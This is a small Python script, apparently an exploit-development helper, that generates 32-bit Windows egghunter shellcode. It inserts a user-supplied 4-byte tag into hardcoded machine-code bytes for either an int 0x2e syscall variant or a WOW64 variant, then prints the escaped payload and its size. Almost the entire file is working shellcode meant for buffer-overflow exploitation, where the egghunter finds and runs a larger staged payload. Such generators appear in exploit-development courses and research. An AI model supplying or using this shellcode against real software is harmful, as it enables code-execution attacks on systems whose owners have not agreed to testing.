#!/usr/bin/env python

import sys

for i in range(1, len(sys.argv), 2):
	if sys.argv[i] == "-s":
		egg = sys.argv[i+1].encode()
	elif sys.argv[i] == "-t":
		etype = sys.argv[i+1]
	elif sys.argv[i] == "-h":
		print("Usage : ./EggHunterGenrator.py <args>\n-s - <4 byte String>\n -t - EggHunter Type (-h for EggHunter type and usage)")
	else:
		print("Invalid Args\nUsage : ./EggHunterGenrator.py <args>\n-s - <4 byte String>\n -t - EggHunter Type (-h for EggHunter type and usage)")

if etype == "-h":
	print("Dsyscall - Reliable for older 32 bit OS and uses less memory\nWOW64 - Reliable for 32 bit execution over 64 bit address space might work with 32 bit directly but unreliable")
	sys.exit()
elif etype == "Dsyscall":		
	egghunter = b'\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8'
	if len(egg) != 4:
		print("Invalid Egg should be four bytes")
		sys.exit()
	else:
		egghunter += egg
	egghunter += b'\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7'
elif etype == "WOW64":
	egghunter = b'\x31\xd2\x66\x81\xca\xff\x0f\x31\xdb\x42\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05\x74\xdf\xb8'
	if len(egg) != 4:
		print("Invalid Egg should be four bytes")
		sys.exit()
	else:
		egghunter += egg
	egghunter += b'\x89\xd7\xaf\x75\xda\xaf\x75\xd7\xff\xe7'

segghunter = ''.join(f'\\x{b:02x}' for b in egghunter)
print(segghunter)

sizereq = len(egghunter)
print(f"EggHunter size: {sizereq}")
